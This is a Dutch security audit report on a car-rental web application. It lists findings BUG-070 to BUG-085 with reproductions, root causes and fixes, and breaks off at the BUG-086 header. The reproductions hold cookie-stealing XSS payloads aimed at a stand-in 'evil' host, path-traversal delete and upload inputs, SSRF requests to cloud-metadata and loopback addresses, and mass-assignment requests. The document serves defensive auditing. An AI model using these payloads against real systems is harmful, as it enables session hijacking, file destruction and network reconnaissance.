#### BUG-070 — Arbitrary file delete via `backgroundPath`/`diagramPath` in vier templatemodules
- **Severity:** HIGH · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-011 — *zelfde klasse als BUG-012, mét write-primitief*
- **Feature:** PDF-, damage-check-, report-and-label- en vehicle-diagram-templates (achtergrondafbeeldingen)
- **Reproduction:** Als `manage_pdf_templates`: `PATCH /api/pdf-templates/1 {"backgroundPath":"../../app/dist/server/index.js"}` (geen zodvalidatie, `backgroundPath` wordt expliciet behouden), daarna `DELETE /api/pdf-templates/1/background` → `fs.promises.unlink(path.join(process.cwd(), template.backgroundPath))` verwijdert het doelbestand. Voor `vehicle-diagram-templates` volstaat élk ingelogd account (BUG-066).
- **Expected:** Padvelden worden server-side gegenereerd en elke `unlink`/`read` op een DB-pad gaat door `resolveDocumentFilePath()`.
- **Actual:** `path.join(process.cwd(), <client-zetbare string>)` zonder containmentcheck, op vier plaatsen.
- **Root cause:** `server/routes/pdf-templates.ts:193-245` (`{...req.body}` op `:213`, behoud `backgroundPath` op `:235-238`), `:342-344`, `:429-431`, `:440-441`, `:648-649`, `:658-659`; identiek in `server/routes/damage-check-templates.ts:351,383,484`, `server/routes/report-and-label-templates.ts:278,310,412`, `server/routes/vehicle-diagram-templates.ts:174-176,226-228`.
- **Affected files:** de vier bovengenoemde routebestanden
- **Affected data:** Elk bestand onder of buiten de working directory: `dist/server/index.js`, `dist/public/index.html`, `schema-columns.json`, back-upbestanden.
- **Security impact:** Arbitrary file delete vanaf een template-beheerpermissie (en vanaf élk account via de vehicle-diagram-variant) → DoS van de applicatie of vernietiging van back-ups; anders dan BUG-012 bestaat de write-primitief hier vandaag al.
- **Business impact:** Herhaalbaar de applicatie plat leggen of het herstelpad (back-ups) vernietigen.
- **Fix proposal:** `backgroundPath`/`backgroundPreviewPath`/`diagramPath`/`previewPath` uit de request-body weren (server-side genereren) en elke bestandsoperatie via `resolveDocumentFilePath()` laten lopen.
- **Regression test:** `PATCH` met een `backgroundPath` buiten `uploads/` → veld genegeerd of 400; de daaropvolgende `DELETE` raakt geen bestand buiten `getUploadsDir()`.

#### BUG-071 — SSRF: willekeurige `host:port`-verbinding en directory-listing via de CJIB-FTPS-testroute
- **Severity:** HIGH · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-006
- **Feature:** Boetes — CJIB-FTPS-configuratie testen (`manage_fines`)
- **Reproduction:** `POST /api/fines/cjib-config/test {"host":"169.254.169.254","port":80,…}` of `{"host":"127.0.0.1","port":5432}` — de route gebruikt de **geposte** body, niet de opgeslagen config, en geeft bij succes `{ok:true, files:[…]}` (de directory-listing van de tegenpartij) en bij falen `502 {ok:false, message:<rauwe socketfout>}`.
- **Expected:** Host tegen een allowlist van CJIB-hostnames, generieke foutmelding, geen listing in de respons.
- **Actual:** `host: z.string().trim().max(200)` en `port: 1-65535` zonder enige allowlist of private-range-blokkade; de foutclassificatie (`ECONNREFUSED` / TLS-fout / time-out) is een betrouwbaar orakel.
- **Root cause:** `server/routes/fines.ts:121-133` (+ guard op `:30`), `server/services/cjib/config.ts:7-8`, `server/services/cjib/ftps-client.ts:15-28`; via `PUT /api/fines/cjib-config` herhaalt `server/services/cjib/poller.ts:32-45` de verbinding op een cron.
- **Affected files:** `server/routes/fines.ts:121-133`, `server/services/cjib/config.ts:7-8`, `server/services/cjib/ftps-client.ts:15-28`
- **Affected data:** Geen applicatiedata; wel de netwerktopologie achter de container en de inhoud van bereikbare FTP(S)-shares.
- **Security impact:** Volledige interne portscan en servicefingerprinting vanuit de container (inclusief cloud-metadata-endpoints), plus read-SSRF tegen echte FTP(S)-hosts. Ook bruikbaar als persistente uitgaande verbinding via de poller.
- **Business impact:** Een boeteverwerker (`manage_fines`) kan het interne netwerk van de verhuurder in kaart brengen — de opmaat naar laterale beweging.
- **Fix proposal:** Allowlist op CJIB-hostnames, of minimaal DNS resolven en private/link-local/loopback weigeren (ook na redirect/DNS-rebinding); generieke foutmelding; listing weglaten of tot een aantal reduceren.
- **Regression test:** `POST …/cjib-config/test` met `127.0.0.1`/`169.254.169.254` → 400, en de foutmelding is identiek voor een geweigerde en een niet-bestaande host.

#### BUG-072 — Stored XSS via `javascript:`-URL's die met `window.open()` geopend worden
- **Severity:** HIGH · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-008 (deels runtime onderbouwd via Check 3b)
- **Feature:** Expenses-bonnen, schadecontrole-PDF's en documentlinks in de client
- **Reproduction:** Sla als `manage_expenses`-gebruiker (of, voor de damage-check-variant, als élk ingelogd account, zie BUG-065) `javascript:fetch('//evil/'+document.cookie)` op in `receiptUrl`/`pdfPath`/`filePath`. Een collega opent het detailvenster en klikt het oog-icoon → `window.open(<waarde>, '_blank')` voert het script uit op de app-origin. Check 3b bewijst live dat zo'n `javascript:`-URL via een multipart-request **ongefilterd** in de database komt (BUG-086).
- **Expected:** Eén gedeelde `isSafeHttpUrl()`-helper vóór elke `window.open(<db-string>)`, die alleen `http:`/`https:` en relatieve paden toestaat.
- **Actual:** Geen enkele scheme-check in `client/src`; de server-side sanitizer strip alleen tags en laat een string zonder `<` volledig intact.
- **Root cause:** `client/src/components/expenses/expense-view-dialog.tsx:386`; `client/src/components/reservations/pickup-return-dialogs.tsx:737,782,1538,1583`; `client/src/components/reservations/reservation-documents-dialog.tsx:154`; invoerveld `client/src/components/expenses/expense-form.tsx:493`; kolom `shared/schema.ts:1007` (`text`, geen `z.string().url()`); sanitizer `server/middleware/security/sanitization.ts:41`.
- **Affected files:** de vijf bovengenoemde clientbestanden, `shared/schema.ts:1007`
- **Affected data:** `expenses.receipt_url`, `interactive_damage_checks.pdfPath`, `documents.filePath`.
- **Security impact:** Stored XSS op de app-origin. De sessiecookie is `httpOnly`, maar het CSRF-token is JS-leesbaar (`csrf.ts:108`), dus de aanvaller kan namens het slachtoffer muteren — bijvoorbeeld `PATCH /api/users/<eigen-id> {"role":"admin"}` als het slachtoffer `manage_users` heeft (BUG-063). De CSP biedt geen mitigatie (BUG-078).
- **Business impact:** Privilege-escalatie via een collega, zonder dat die iets ongewoons ziet.
- **Fix proposal:** `isSafeHttpUrl()`-helper vóór elke `window.open`; `z.string().url()` op `receiptUrl`; `receiptFilePath`/`pdfPath`/`filePath` uit de insert-schema's `.omit()`-en.
- **Regression test:** Een record met `receiptUrl: "javascript:alert(1)"` mag door de UI niet geopend worden (helper geeft `false`), en de API moet de waarde weigeren.

#### BUG-073 — DOM-XSS via `innerHTML` met `driver.licenseFilePath`
- **Severity:** HIGH · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-009 (DOM-executie niet getest — geen browser, zie §7)
- **Feature:** Chauffeurskaart (`driver-view-dialog`)
- **Reproduction:** Sla `x" onmouseover="fetch('//evil/'+document.cookie)` op als `licenseFilePath` — onder meer via `POST /api/portal/drivers` (`server/routes/portal.ts:463`, `{...parsed.data}` gaat door) of de staff-driver-routes. Er zit geen `<` in, dus de server-side tag-stripper laat het staan. Het bogus pad laat de `<img>` falen, `onError` vuurt en de attribuut-breakout wordt in het DOM geschreven zodra een medewerker de kaart opent.
- **Expected:** Het fallback-blok opbouwen met `document.createElement` + `textContent`/`setAttribute`, zoals `client/src/components/barcodes/key-label-print.ts:139` al correct doet.
- **Actual:** Rauwe interpolatie in `<a href="/${driver.licenseFilePath}">` via `innerHTML`.
- **Root cause:** `client/src/components/customers/driver-view-dialog.tsx:165` (payload op `:168`, trigger via `onError` op `:156`); `insertDriverSchema` (`shared/schema.ts:417`) omit `licenseFilePath` niet.
- **Affected files:** `client/src/components/customers/driver-view-dialog.tsx:156-168`, `shared/schema.ts:417`
- **Affected data:** `drivers.license_file_path`.
- **Security impact:** Self-triggering stored XSS op de app-origin, injecteerbaar **vanuit het klantportaal** — de laagste privilegedrempel van alle XSS-bevindingen. Zelfde vervolgstap als BUG-072 (muteren met het JS-leesbare CSRF-token).
- **Business impact:** Een klant kan een medewerkerssessie kapen zodra die de chauffeursgegevens opent.
- **Fix proposal:** `createElement`/`textContent` in plaats van `innerHTML`; `licenseFilePath` server-side zetten en uit het insert-schema omitten.
- **Regression test:** Een driver met `licenseFilePath` met een dubbele quote openen; het DOM mag geen extra attribuut/handler bevatten (unit test op de fallback-render).

#### BUG-074 — `apiLimiter`'s "skip voor ingelogde gebruikers" vuurt nooit; één gedeelde 1000/15 min-bucket per IP voor iedereen
- **Severity:** HIGH · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** AM-001 (superseert SR-002; vervangt fase-1a-risico #14)
- **Feature:** Generieke API-rate-limiting
- **Reproduction:** `apiLimiter` wordt gemount op `server/index.ts:174`, vóór `setupAuth()` op `:187`; `skip: (req) => req.isAuthenticated && req.isAuthenticated()` is daardoor altijd falsy — `req.isAuthenticated` bestaat op dat moment nog niet. Empirisch: in de oorspronkelijke AM-run kreeg `admin` op één IP exact even snel `429` als `anon`. In deze run kreeg **geen enkele van de 3144 verzoeken een 429**, omdat de harness `X-Forwarded-For` elke 200 verzoeken roteert en geen IP boven ~640 verzoeken kwam.
- **Expected:** Ofwel een werkende skip mét een eindige per-sessie/per-gebruiker-limiet, ofwel een bewust gedeelde limiet — maar niet een limiet die iets anders doet dan de code zegt.
- **Actual:** Eén gedeelde bucket van 1000 verzoeken/15 min per bron-IP voor geauthenticeerd én anoniem verkeer, én triviaal te omzeilen door de `X-Forwarded-For`-header te variëren (BUG-009).
- **Root cause:** `server/index.ts:174` vs `:187` (mountvolgorde), `server/middleware/security/rateLimiter.ts:12-23`.
- **Affected files:** `server/index.ts:174,187`, `server/middleware/security/rateLimiter.ts:12-23`
- **Affected data:** Geen; beschikbaarheid en misbruikdetectie.
- **Security impact:** Er bestaat feitelijk **geen** effectieve rate limiting op `/api/*`: wie de header roteert heeft geen enkele bovengrens, en wie dat niet doet deelt zijn budget met alle andere gebruikers achter hetzelfde IP.
- **Business impact:** Eén kantoor achter NAT of één drukke integratie legt de API voor alle collega's plat (429), terwijl een aanvaller de limiet gratis omzeilt — het omgekeerde van de bedoeling.
- **Fix proposal:** `apiLimiter` ná `setupAuth()` mounten zodat `skip()` überhaupt kan werken, en de skip vervangen door een eindige per-gebruikerslimiet (`keyGenerator` op `req.user.id`, val terug op `req.ip`); samen oplossen met `trust proxy` (BUG-009/BUG-082).
- **Regression test:** 1100 verzoeken vanaf één IP als ingelogde gebruiker → de limiet slaat aan op de per-gebruikerdrempel; dezelfde 1100 verzoeken met 6 verschillende `X-Forwarded-For`-waarden → nog steeds gelimiteerd.

#### BUG-075 — `GET /api/backups/download-data` lekt de live Postgres-connectiestring in de foutrespons
- **Severity:** HIGH — *bron AM-004 gaf MEDIUM; genormaliseerd naar HIGH conform BUG-010 (secretdisclosure aan een `manage_backups`-account)* · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** AM-004
- **Feature:** Backups — data-export downloaden (`manage_backups`)
- **Reproduction:** `GET /api/backups/download-data` als `manager` of `admin` → **500** (2 van de 19 5xx-rijen in de matrix), met in `details` de door Node gesynthetiseerde `error.message`: de volledige `pg_dump`-commandoregel inclusief `DATABASE_URL` (gebruiker, wachtwoord, host, database) en een absoluut lokaal filesystempad.
- **Expected:** Server-side loggen, client-facing een generieke melding zonder commandoregel of pad.
- **Actual:** De rauwe commandoregel wordt verbatim teruggegeven.
- **Root cause:** `server/routes/backups.ts:95` interpoleert `DATABASE_URL` in een shell-commandostring; de `catch` op `:110-116` retourneert `error.message` als `details`.
- **Affected files:** `server/routes/backups.ts:95,110-116`
- **Affected data:** `DATABASE_URL` (databasecredentials) en de filesysteemlayout van de server.
- **Security impact:** Volledige databasecredentials naar een permissietier dat ze niet hoort te zien; als de database netwerkbereikbaar is, is dat directe, ongelimiteerde toegang tot alle klantgegevens — buiten de applicatie en dus buiten elke audit trail om.
- **Business impact:** Eén backup-operator (of een gecompromitteerd backup-account) kan de volledige database kopiëren.
- **Fix proposal:** `pg_dump` via `spawn()` met een argumentarray en `PGPASSWORD` in de env in plaats van string-interpolatie; in de `catch` uitsluitend een generieke melding teruggeven en het detail server-side loggen.
- **Regression test:** Forceer de fout (bijv. `pg_dump` niet geïnstalleerd) en assert dat de respons geen `postgres://`, geen `password` en geen absoluut pad bevat.

### 2.3 MEDIUM

#### BUG-076 — Path traversal bij schrijven in `POST /api/backups/upload` via `originalname`
- **Severity:** MEDIUM · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-005
- **Feature:** Back-upbestand uploaden (`manage_backups`)
- **Reproduction:** Upload met `filename="../../server/x.sql"` → `newFilename` wordt `uploaded-<type>-<ts>-../../server/x.sql` en `path.join(backupDir, newFilename)` normaliseert de `../` weg uit de basisdirectory; het bestand belandt buiten `backups/`.
- **Expected:** `sanitizeFilename(file.originalname)` (bestaat al, `fileUploadSecurity.ts:81`) of de originele naam volledig weggooien, plus een `path.resolve()`-containmentcheck.
- **Actual:** `file.originalname` gaat ongefilterd uit de `Content-Disposition` naar de bestandsnaam; de sanitizer wordt hier — anders dan bij de diagram-, fuel-receipt- en fines-uploads — niet toegepast.
- **Root cause:** `server/routes/backups.ts:803-810` (`fs.renameSync(file.path, destinationPath)`); extensiecontrole op `:785-795` beperkt het resultaat tot `.sql`/`.gz`/`.tar.gz`/`.tgz`.
- **Affected files:** `server/routes/backups.ts:785-810`
- **Affected data:** Elk bestand met een van die extensies, waar dan ook op het filesysteem.
- **Security impact:** Arbitrary write met beperkte extensie — geen directe RCE, wel het overschrijven van bestaande dumps en van de veiligheidsback-up waar BUG-069 op leunt.
- **Business impact:** Back-ups kunnen stil vervangen worden door een geprepareerd bestand, waardoor herstel na incident faalt.
- **Fix proposal:** `sanitizeFilename()` toepassen of alleen `uploaded-${type}-${timestamp}${ext}` schrijven, daarna verifiëren dat `path.resolve(destinationPath)` binnen `backupDir` valt.
- **Regression test:** Upload met `filename="../../x.sql"` → het bestand staat in `backups/` met een geneutraliseerde naam, nergens anders.

#### BUG-077 — SSRF/portscan-orakel via de SMTP-testroute
- **Severity:** MEDIUM · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-007
- **Feature:** E-mailinstellingen testen (`manage_settings`)
- **Reproduction:** `POST /api/app-settings/email/test {"smtpHost":"127.0.0.1","smtpPort":6379,"smtpUser":"a","smtpPassword":"b"}` — `transporter.verify()` classificeert de fout en die classificatie komt als `userMessage` terug; aan het onderscheid open/dicht/time-out (10 s) is af te lezen welke interne poorten leven.
- **Expected:** Private/link-local/loopback-ranges weigeren en de foutclassificatie niet naar de client uitsplitsen.
- **Actual:** `smtpHost`/`smtpPort` komen ongevalideerd uit `req.body` (alleen een truthiness-check).
- **Root cause:** `server/routes/app-settings.ts:309-330` (check op `:313`), `server/utils/email-service.ts:208-221` en `:142,150,168` (foutclassificatie).
- **Affected files:** `server/routes/app-settings.ts:309-330`, `server/utils/email-service.ts:142-221`
- **Affected data:** Geen; wel de interne netwerktopologie.
- **Security impact:** Blinde maar bruikbare interne portscanner vanaf een `manage_settings`-account; zelfde klasse als BUG-071, lagere informatiedichtheid (geen listing).
- **Business impact:** Verkenning van het interne netwerk door een beheerdersaccount zonder dat er iets in de applicatielogging opvalt.
- **Fix proposal:** Zelfde als BUG-071 — private ranges weigeren en één generieke foutmelding.
- **Regression test:** `POST …/email/test` met `127.0.0.1` → 400; de melding voor "poort dicht" en "poort open, geen SMTP" is identiek.

#### BUG-078 — CSP staat `unsafe-inline` en `unsafe-eval` toe, ook in productie
- **Severity:** MEDIUM · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-012 (runtime bevestigd, Check 1)
- **Feature:** Security headers
- **Reproduction:** `GET /` → header `Content-Security-Policy: … script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net …` — ongeconditioneerd, live geverifieerd op de draaiende server. `imgSrc: ["https:"]` staat exfiltratie naar elke HTTPS-host toe; `connectSrc` bevat `ws:`/`wss:` zonder hostrestrictie.
- **Expected:** `unsafe-inline`/`unsafe-eval` alleen als `NODE_ENV !== 'production'`, zoals `upgradeInsecureRequests` (`:46`) dat wél doet.
- **Actual:** De comment noemt development, maar er is geen `NODE_ENV`-conditie.
- **Root cause:** `server/middleware/security/headers.ts:14-19`, `:34`
- **Affected files:** `server/middleware/security/headers.ts:14-46`
- **Affected data:** Geen direct; dit is een ontbrekende mitigatielaag.
- **Security impact:** De CSP levert nul mitigatie voor BUG-072, BUG-073, BUG-086 en BUG-102 — een injectie die anders geblokkeerd zou worden, draait gewoon, en exfiltratie via image-beacons naar elke HTTPS-host is toegestaan.
- **Business impact:** De aanwezige security-header wekt de indruk van bescherming die er niet is.
- **Fix proposal:** `unsafe-inline`/`unsafe-eval` gaten op `NODE_ENV`; `cdn.jsdelivr.net` schrappen als er geen CDN-script geladen wordt; `imgSrc` naar `'self' data: blob:`; `connectSrc` naar de eigen origin.
- **Regression test:** Met `NODE_ENV=production` mag de CSP-header geen `unsafe-inline`/`unsafe-eval` bevatten.

#### BUG-079 — De request-logger schrijft volledige JSON-responsebodies naar de containerlog
- **Severity:** MEDIUM · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-013 — *versterkt BUG-010*
- **Feature:** Request-logging
- **Reproduction:** Elke `/api`-respons wordt gelogd als `… :: ${JSON.stringify(capturedJsonResponse)}`, afgekapt op 200 tekens — kleine responses gaan dus volledig de log in: `GET /api/settings/key/smtp_password`, `POST /api/app-settings/email/test`, `GET /api/user`, portal-tokenresponses, `GET /api/backups/health` (bevat `backupPath`).
- **Expected:** Geen responsebodies loggen, of een padallowlist met redactie van bekende sleutels (`smtpPassword`, `password`, `token`, `cjibPassword`).
- **Actual:** `res.json` wordt gemonkeypatcht en de body onbewerkt gelogd.
- **Root cause:** `server/index.ts:249-266`, in het bijzonder `:263`.
- **Affected files:** `server/index.ts:249-266`
- **Affected data:** Alles wat de API teruggeeft, inclusief secrets die verder achter permissies zitten.
- **Security impact:** Permanent lek richting iedereen met toegang tot de Coolify-/Docker-logs of een gearchiveerde logbundel — geen aanvaller nodig. Runtime-check 4 bevestigt dat `req.body` níet gelogd wordt (dus geen wachtwoorden bij mislukte logins), maar responses dus wél.
- **Business impact:** Loganalyse-/monitoringtoegang wordt de facto een secretstore; ook AVG-relevant (klantgegevens in logs).
- **Fix proposal:** Responsebody-logging uitzetten of achter een expliciete debug-vlag; anders redactie vóór `JSON.stringify`.
- **Regression test:** Na `GET /api/app-settings/email` mag de logregel geen `smtpPassword`-waarde bevatten.

#### BUG-080 — TLS-certificaatvalidatie uitgeschakeld voor alle uitgaande SMTP
- **Severity:** MEDIUM · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-015
- **Feature:** E-mailverzending
- **Reproduction:** Beide nodemailer-transports zetten `tls: { rejectUnauthorized: false }`. Aanvullend bepaalt `smtpSecure` zich met de string-vergelijking `value.smtpPort === '465'`, die `false` oplevert zodra de poort als getal is opgeslagen — waardoor STARTTLS stilzwijgend kan wegvallen.
- **Expected:** `rejectUnauthorized: true`; een specifieke mismatch oplossen met expliciete `ca`/`servername`; `Number(port) === 465`.
- **Actual:** Globale uitschakeling van certificaatvalidatie, met als comment "Allow certificate validation bypass for servers with certificate mismatches".
- **Root cause:** `server/utils/email-service.ts:216-218` (test-transport), `:261-263` (verzend-transport), `:97-105` (`smtpSecure`).
- **Affected files:** `server/utils/email-service.ts:97-105,216-218,261-263`
- **Affected data:** SMTP-credentials en de volledige inhoud van uitgaande mail: contracten, boetebrieven en portaal-uitnodigingslinks met activatietokens.
- **Security impact:** Een MITM tussen container en mailserver kan het certificaat vervangen en zo mail én credentials onderscheppen. De uitnodigingstokens (`server/services/portal-tokens.ts:10`) geven directe accountovername in het klantportaal.
- **Business impact:** Contracten en klantcorrespondentie onderweg leesbaar; overname van klantportaalaccounts.
- **Fix proposal:** `rejectUnauthorized: true` en `smtpSecure` numeriek afleiden.
- **Regression test:** Verzenden naar een stub met een zelfondertekend certificaat moet falen tenzij een expliciete `ca` is geconfigureerd.

#### BUG-081 — Geauthenticeerde mail relay: vrije ontvangers, ongeëscapete HTML en echte bijlagen vanaf het bedrijfsdomein
- **Severity:** MEDIUM · **Status:** OPEN · **Type:** **Bedrijfsregel/procesbesluit** (ontvanger-allowlist is een procesbesluit; de HTML-escaping is een technische fix) · **Bron:** SEC-016 (deels weerlegd door Check 3c, zie §3)
- **Feature:** Document per e-mail versturen (`manage_documents`) en notificatiemail
- **Reproduction:** `POST /api/documents/:id/email` neemt `recipients` (`.split(',')`), `subject` en `message` uit de body en stuurt het bericht met de bedrijfs-`from` en het echte document als bijlage naar elk opgegeven adres. Idem `server/routes.ts:5374-5380` (meerdere bijlagen) en `server/routes/notifications.ts:432-437`.
- **Expected:** Ontvangers beperkt tot adressen die aan de betreffende klant/reservering hangen (of een geconfigureerde allowlist); `subject`/`message` HTML-escapen in de route zelf.
- **Actual:** Geen allowlist, geen escaping in de route (`message` krijgt alleen `\n → <br>`, `routes.ts:5276`).
- **Root cause:** `server/routes.ts:5226,5266-5290,5374-5380`, `server/routes/notifications.ts:432-437`.
- **Affected files:** `server/routes.ts:5226-5290,5374-5380`, `server/routes/notifications.ts:432-437`
- **Affected data:** Elk document in het systeem (contracten, rijbewijsscans, boetebrieven) plus de mailreputatie/SPF van het bedrijfsdomein.
- **Security impact:** Documentexfiltratie naar een willekeurig extern adres en phishing vanaf het echte bedrijfsdomein. **Runtime-nuance:** de HTML-injectie zelf bleek op deze JSON-route niet bereikbaar — de globale sanitizer strip de payload vóór de interpolatie (Check 3c); de ontvangervrijheid en de bijlage-exfiltratie blijven onverkort staan.
- **Business impact:** Reputatieschade en een AVG-datalek door één medewerker met `manage_documents`; geen enkele registratie (`email_logs` blijft leeg, zie 03-rapport §3).
- **Fix proposal:** Ontvangers valideren tegen de klant/reservering van het document (procesbesluit: wanneer mag naar een vrij adres gemaild worden?); `subject`/`message` expliciet escapen in de route; `fromName`/`fromEmail` valideren (BUG-100).
- **Regression test:** `POST /api/documents/:id/email` naar een adres dat niet bij de klant hoort → 403; een `<script>`-payload in `message` komt geëscaped in de HTML-body.

#### BUG-082 — `X-Forwarded-For` wordt vertrouwd voor de IP-adressen in de audit-log en `active_sessions`
- **Severity:** MEDIUM · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-017 + SR-004 — *zelfde header als BUG-009, andere sink*
- **Feature:** Auditlogging en sessie-tracking
- **Reproduction:** Stuur `X-Forwarded-For: 10.0.0.99` mee bij elk verzoek; `audit_logs` en `active_sessions` registreren dat adres. **Live bewezen:** deze audit stuurde bewust `X-Forwarded-For: 203.0.113.77` mee en álle nieuwe `active_sessions`-steekproefrijen tonen letterlijk `ip_address: "203.0.113.77"` — een volledig verzonnen waarde.
- **Expected:** Overal `req.ip` gebruiken (Express past `trust proxy` al toe) en de eigen `getClientIp`-helpers verwijderen; `trust proxy` alleen zetten als er echt een `X-Forwarded-For`-herschrijvende proxy vóór staat.
- **Actual:** De helpers nemen de **eerste** waarde uit de header — precies het deel dat de client zelf zet.
- **Root cause:** `server/utils/security/auditLogger.ts:103-106`, `server/utils/security/sessionManager.ts:175-181`; onderliggend `server/auth.ts:135` (`app.set("trust proxy", 1)`).
- **Affected files:** `server/utils/security/auditLogger.ts:103-106`, `server/utils/security/sessionManager.ts:175-181`, `server/auth.ts:135`
- **Affected data:** `audit_logs.ip_address`, `active_sessions.ip_address`, `login_attempts`.
- **Security impact:** Elk forensisch onderzoek dat op deze kolommen leunt is te vervuilen; "verdachte login vanaf IP X"-detectie is waardeloos. Relevant precedent: het voertuig-verwijderincident van 2026-08-25 is met precies dit soort logging onderzocht.
- **Business impact:** Bij een volgend incident wijst het onderzoek naar een verzonnen adres; de "actieve sessies"-beheerpagina toont onbetrouwbare informatie.
- **Fix proposal:** `req.ip` overal; `trust proxy` afstemmen op de werkelijke Coolify-/Traefik-topologie en verifiëren dat die proxy een client-`X-Forwarded-For` overschrijft in plaats van toevoegt (samen met BUG-009 en BUG-074).
- **Regression test:** Login met een gespoofte `X-Forwarded-For`; `active_sessions.ip_address` en `audit_logs.ip_address` moeten het TCP-peer-adres bevatten, niet de headerwaarde.

#### BUG-083 — Portaalsessies vallen terug op het hardgecodeerde secret `"portal-dev-secret"`
- **Severity:** MEDIUM · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-018 (+ SEC-037)
- **Feature:** Sessiebeheer klantportaal
- **Reproduction:** Draait de container zonder `SESSION_SECRET` (mogelijk: `resolveSessionSecret` logt in productie alleen een fout en gaat door, `server/auth.ts:67-85` / SEC-037), dan gebruikt de portaalstack `"portal-dev-secret"` — een string die in een publieke repo staat.
- **Expected:** Dezelfde `resolveSessionSecret()` als de staffstack, en in productie hard falen zonder `SESSION_SECRET`.
- **Actual:** `secret: process.env.SESSION_SECRET || "portal-dev-secret"`, zonder waarschuwing.
- **Root cause:** `server/portal-auth.ts:163`; contrast met `server/auth.ts:67-85`.
- **Affected files:** `server/portal-auth.ts:163`, `server/auth.ts:67-85`
- **Affected data:** Ondertekening van `portal.sid`.
- **Security impact:** Sessiegegevens staan server-side in Postgres, dus dit geeft niet direct een geldige sessie — maar het maakt sessiefixatie en het geldig ondertekenen van een geraden/gelekt `sid` triviaal, en het maskeert de misconfiguratie in plaats van hem te melden. `/health` verklapt bovendien of `SESSION_SECRET` gezet is (BUG-093).
- **Business impact:** Een deploy zonder `SESSION_SECRET` levert een stil verzwakt klantportaal op, zonder enig signaal.
- **Fix proposal:** `resolveSessionSecret()` hergebruiken; in productie `process.exit(1)` zonder secret (lost SEC-037 mee op).
- **Regression test:** Start zonder `SESSION_SECRET` met `NODE_ENV=production` → proces start niet.

#### BUG-084 — Mass assignment op `PATCH /api/reservations/:id`: rauwe body naar `db.update()`
- **Severity:** MEDIUM · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-019 — *verlengt BUG-016*
- **Feature:** Reservering bewerken (`manage_reservations`)
- **Reproduction:** `PATCH /api/reservations/5 {"id":9999}` → de primaire sleutel verspringt en alle verwijzingen (documenten, schadecontroles, transporten, boetes) wijzen naar een niet-bestaande rij. Ook `{"deletedBy":"iemand-anders"}` (audit trail vervalsen) en `{"deletedAt":null}` (prullenbak-workflow omzeilen) zijn schrijfbaar.
- **Expected:** `insertReservationSchemaBase.partial().parse(req.body)`, zoals `/api/customers` (`routes.ts:2072`) al doet; audit-/soft-deletevelden server-side.
- **Actual:** `const reservationData = req.body;` met de comment *"For updates, bypass full schema validation and just use the raw data"*.
- **Root cause:** `server/routes.ts:3517` → `server/database-storage.ts:1209-1246` (`.set(dataToUpdate)`); `insertReservationSchemaBase` (`shared/schema.ts:802-808`) omit de velden wél, maar wordt hier niet toegepast.
- **Affected files:** `server/routes.ts:3517`, `server/database-storage.ts:1209-1246`
- **Affected data:** Elke kolom van `reservations`, inclusief `id`, `deletedAt`, `deletedBy`, `createdBy`, `contractNumber`, `status`, `type`.
- **Security impact:** Vervalsing van de audit trail en omzeiling van de soft-deleteworkflow; BUG-016 dekt alleen de `status`-kolom, dit is de volledige rij.
- **Business impact:** Onherstelbare integriteitsschade: een verplaatste `id` maakt alle gekoppelde documenten en schadecontroles wees, zonder foutmelding.
- **Fix proposal:** Het bestaande zodschema `.partial()` toepassen en `id`/`createdAt`/`createdBy`/`deletedAt`/`deletedBy` uit de body weren.
- **Regression test:** `PATCH /api/reservations/:id {"id":9999,"deletedBy":"x"}` → 400 of velden genegeerd; de rij houdt zijn `id`.

#### BUG-085 — `/uploads` is statisch bereikbaar voor élke ingelogde medewerker, zonder permissiecheck
- **Severity:** MEDIUM · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-020 (runtime evidence via Check 8/9, zie ook BUG-026)
- **Feature:** Statische uploadsmount
- **Reproduction:** Als account met alleen `view_vehicles`: `GET /uploads/<KENTEKEN>/fuel_receipt/…`, `/uploads/drivers/license_customer<id>_<ts>.pdf`, `/uploads/templates/…` → het bestand wordt geserveerd. Live tijdens deze audit: `GET /uploads/12XT102/receipts/12XT102_receipt_tires_2026-01-24_1788033206383.pdf` → **200, `application/pdf`, 308048 bytes** — een echte garagebon uit een **andere omgeving** die dezelfde checkout deelt.
- **Expected:** Bestanden uitsluitend via de bestaande, gescopete downloadroutes; blijft de mount bestaan, dan minimaal `hasPermission(MANAGE_DOCUMENTS)` en `getUploadsDir()`.
- **Actual:** Alleen `requireAuth`, en `uploadsPath` is hardgecodeerd als `path.join(process.cwd(), 'uploads')` in plaats van `getUploadsDir()` (dat is BUG-026, hier de verzwarende consequentie).
- **Root cause:** `server/index.ts:336-338`; helper `shared/paths.ts:12`.
- **Affected files:** `server/index.ts:336-338`, `shared/paths.ts:12`
- **Affected data:** Contracten, rijbewijsscans (`uploads/drivers`), schadecontrolefoto's, boetebrieven (`uploads/fines`), portaalbijlagen (`uploads/portal-requests`).
- **Security impact:** De per-klant-scoping van de portaalroutes (`server/routes/portal.ts:193,220,289`) is te omzeilen zodra iemand een willekeurig staffaccount heeft; veel bestandsnamen zijn afleidbaar uit API-responses die dezelfde gebruiker wél mag zien. In deze deployment lekte de mount aantoonbaar over omgevingsgrenzen heen.
- **Business impact:** Klantdocumenten (rijbewijzen!) staan open voor elke medewerker, ongeacht rol — een AVG-probleem in de dagelijkse praktijk, geen theoretisch scenario.
- **Fix proposal:** De statische mount verwijderen en alles via de gescopete downloadroutes serveren; minimaal `hasPermission(MANAGE_DOCUMENTS)` + `getUploadsDir()`.
- **Regression test:** `GET /uploads/drivers/<bekend bestand>` met `permissions:["view_vehicles"]` → 403.

#### BUG-086 — De globale input-sanitizer raakt multipart-bodies niet (bewezen stored payload)
